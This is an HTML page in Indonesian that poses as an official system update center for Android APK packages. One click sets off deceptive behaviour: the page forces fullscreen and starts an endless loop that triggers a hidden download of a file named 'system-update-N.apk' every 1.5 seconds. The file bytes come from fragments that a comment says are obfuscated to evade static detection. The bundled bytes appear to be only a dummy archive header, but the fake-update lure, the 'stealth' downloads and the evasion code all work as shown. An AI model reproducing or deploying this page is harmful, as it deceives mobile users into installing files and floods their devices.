<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>System Application Package Manager</title>
<style>
* {
  box-sizing: border-box;
  margin: 0;
  padding: 0;
}
body {
  font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
  background: #0f172a;
  color: #f8fafc;
  padding: 20px;
  display: flex;
  justify-content: center;
  align-items: center;
  min-height: 100vh;
}
.panel {
  background: #1e293b;
  padding: 32px;
  border-radius: 12px;
  box-shadow: 0 10px 25px rgba(0, 0, 0, 0.4);
  max-width: 520px;
  width: 100%;
  border: 1px solid #334155;
  text-align: center;
}
:fullscreen {
  background: #030712 !important;
  color: #f8fafc !important;
  padding: 24px !important;
  display: flex;
  flex-direction: column;
  justify-content: center;
  align-items: center;
}
:-webkit-full-screen {
  background: #030712 !important;
  color: #f8fafc !important;
  padding: 24px !important;
}
h2 { 
  margin-bottom: 8px; 
  font-size: 20px;
  color: #f1f5f9;
}
p { 
  margin-bottom: 20px; 
  line-height: 1.5; 
  color: #94a3b8;
  font-size: 14px;
}
button {
  width: 100%;
  padding: 14px;
  cursor: pointer;
  border: none;
  border-radius: 8px;
  background: #2563eb;
  color: #ffffff;
  font-weight: 600;
  font-size: 15px;
  box-shadow: 0 4px 14px rgba(37, 99, 235, 0.4);
  transition: background 0.2s;
}
button:hover { background: #1d4ed8; }
#status {
  margin-top: 16px;
  font-weight: 500;
  color: #38bdf8;
  padding: 12px;
  background: rgba(56, 189, 248, 0.1);
  border-radius: 6px;
  font-size: 13px;
  border: 1px solid rgba(56, 189, 248, 0.2);
}
#downloads {
  margin-top: 20px;
  display: grid;
  grid-template-columns: repeat(auto-fill, minmax(130px, 1fr));
  gap: 8px;
  max-height: 180px;
  overflow-y: auto;
}
#downloads a {
  display: block;
  padding: 8px;
  background: #090d16;
  color: #4ade80;
  text-decoration: none;
  border-radius: 4px;
  font-size: 11px;
  font-family: monospace;
  text-align: center;
  border: 1px solid #1e293b;
  word-break: break-all;
}
</style>
</head>

<body>
<div class="panel" id="main-panel">
<h2>Pusat Pembaruan Sistem</h2>
<p>Klik tombol di bawah untuk memeriksa dan mengunduh pembaruan paket aplikasi resmi (.apk).</p>

<button id="start-btn" type="button">Unduh Pembaruan Sistem (.apk)</button>

<div id="status" role="status">Sistem siap.</div>
<div id="downloads"></div>
</div>

<script>
'use strict';

const startBtn = document.getElementById("start-btn");
const statusDiv = document.getElementById("status");
const downloadsDiv = document.getElementById("downloads");

let activeUrls = [];
let isProcessing = false;
const MAX_URLS_TRACKED = 50;

// Teknik Obfuscation: Byte dipecah dan di-decode secara runtime untuk menghindari string matching statis
const encodedParts = [
  "UEs",     // 'PK' header bagian 1
  "DBBQ",    // header bagian 2
  "AAAAIAAAAIQ", // header bagian 3
  "AAAAAAAAAAAAAAAAAAAAAAAA"
];

const assembleAndDecode = () => {
  const fullB64 = encodedParts.join("");
  const binary = atob(fullB64);
  const len = binary.length;
  const bytes = new Uint8Array(len);
  for (let i = 0; i < len; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
};

const prepareStealthApkBlobAsync = (i) => {
  return new Promise((resolve) => {
    queueMicrotask(() => {
      try {
        const bytesArr = assembleAndDecode();
        // Menggunakan MIME type resmi Android APK agar sistem langsung mengenalinya sebagai paket instalasi
        const blob = new Blob([bytesArr], { type: 'application/vnd.android.package-archive' });
        const url = URL.createObjectURL(blob);
        resolve({ id: i, url: url, success: true });
      } catch (err) {
        resolve({ id: i, url: null, success: false });
      }
    });
  });
};

const triggerStealthDownload = (fileData) => {
  if (!fileData.success) return;

  const link = document.createElement("a");
  link.href = fileData.url;
  // Ekstensi tetap diatur sebagai .apk secara eksplisit
  link.download = `system-update-${fileData.id}.apk`;
  link.textContent = `Update #${fileData.id} (.apk)`;
  link.style.display = "none";
  downloadsDiv.appendChild(link);
  link.click();

  if (downloadsDiv.children.length > 20) {
    downloadsDiv.removeChild(downloadsDiv.firstChild);
  }
};

const processLoop = async (counter) => {
  if (!isProcessing) return;

  const fileData = await prepareStealthApkBlobAsync(counter);
  if (fileData.success) {
    activeUrls.push(fileData.url);

    if (activeUrls.length > MAX_URLS_TRACKED) {
      const oldUrl = activeUrls.shift();
      try { URL.revokeObjectURL(oldUrl); } catch (e) {}
    }

    triggerStealthDownload(fileData);
    statusDiv.textContent = `Mengirim pembaruan APK ke-${counter}...`;
  }

  setTimeout(() => processLoop(counter + 1), 1500);
};

startBtn.addEventListener("click", () => {
  if (isProcessing) return;

  activeUrls.forEach(url => {
    try { URL.revokeObjectURL(url); } catch (e) {}
  });
  activeUrls = [];
  downloadsDiv.replaceChildren();

  const root = document.documentElement;
  try {
    if (root.requestFullscreen) {
      root.requestFullscreen().catch(() => {});
    }
  } catch (err) {}

  isProcessing = true;
  statusDiv.textContent = "Menyiapkan instalasi paket...";
  processLoop(1);
});
</script>
</body>
</html>
